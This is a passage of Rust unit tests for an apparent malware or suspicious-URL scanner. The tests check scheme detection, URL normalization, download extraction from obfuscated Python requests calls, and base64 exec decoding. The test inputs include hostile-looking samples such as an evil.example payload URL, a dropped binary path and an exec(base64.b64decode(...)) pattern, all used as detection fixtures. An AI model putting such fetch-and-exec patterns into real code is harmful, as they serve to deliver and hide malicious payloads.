        assert!(contains_liberal_url_scheme("fTp://evil.example/payload"));
    }

    #[test]
    fn plain_text_without_scheme_is_ignored() {
        assert!(!contains_liberal_url_scheme("curl payload.exe"));
    }

    #[test]
    fn go_import_noise_context_is_detected_without_lowercasing() {
        assert!(is_noise_url_context(
            r#"<MeTa NaMe="Go-Import" Content="x"/>"#,
            "https://github.com/example/project.git",
        ));
        assert!(!is_noise_url_context(
            r#"<MeTa NaMe="Go-Import" Content="x"/>"#,
            "https://github.com/example/project",
        ));
    }

    #[test]
    fn go_import_noise_context_rejects_non_ascii_url_without_panic() {
        assert!(!is_noise_url_context(
            r#"<meta name="go-import" content="x"/>"#,
            "aaaaaaaaaaaaaaaaaaó",
        ));
    }

    #[test]
    fn normalize_liberal_url_token_stops_at_ascii_punctuation() {
        assert_eq!(
            normalize_liberal_url_token("https://example.com/payload);rest").as_deref(),
            Some("https://example.com/payload")
        );
    }

    #[test]
    fn normalize_liberal_url_token_accepts_mixed_slash_file_paths() {
        assert_eq!(
            normalize_liberal_url_token(r#"FiLe:\\C:\Temp\drop.bin"#).as_deref(),
            Some("file:///C:/Temp/drop.bin")
        );
    }

    #[test]
    fn mixed_case_python_request_calls_still_extract_urls() {
        let mut env = Environment::new(&Config::default());
        scan_python_requests_get_deob_text(
            r#"ReQuEsTs.GeT("https://example.test/payload.exe")"#,
            &mut env,
        );
        assert!(env.traits.iter().any(|t| matches!(
            t,
            Trait::Download { src, .. } if src == "https://example.test/payload.exe"
        )));
    }

    #[test]
    fn duplicated_python_b64_literals_are_decoded_once() {
        use base64::Engine;

        let decoded = "print('https://example.test/payload.exe')";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let text = format!("exec(base64.b64decode('{b64}'))\nexec(base64.b64decode('{b64}'))");
        let decoded_literals = decoded_python_b64decode_literals(&text);
        assert_eq!(decoded_literals, vec![decoded.to_string()]);
    }
}
